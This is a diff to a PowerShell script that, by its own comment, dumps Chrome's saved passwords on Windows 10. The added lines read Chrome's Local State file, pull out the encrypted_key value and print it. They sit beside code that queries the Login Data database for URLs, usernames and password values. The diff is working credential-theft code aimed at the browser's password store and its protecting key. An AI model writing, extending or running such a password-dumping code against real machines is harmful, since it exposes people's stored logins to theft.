@@ -1,5 +1,7 @@
-# Assuming Win 10 with Chrome installed, dump the saved passwords...
+# Assuming Win 10 with Chrome and PowerShell 5.1+ installed, dump the saved
+# passwords...
 $dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
+$localStatePath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State"
 $query = "SELECT origin_url, username_value, password_value FROM logins"
 
 Add-Type -AssemblyName System.Security
@@ -52,6 +54,15 @@ Add-Type @"
         }
     }
 "@
+
+$localStateData = Get-Content -Raw $localStatePath
+
+# This is insane, but ConvertFrom-Json doesn't work with this file in PS 5.1.
+$key = (($localStateData -Split 'encrypted_key":"')[1] -split '"')[0]
+
+Write-Host $key
+
+exit
 
 $dbH = 0
 if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
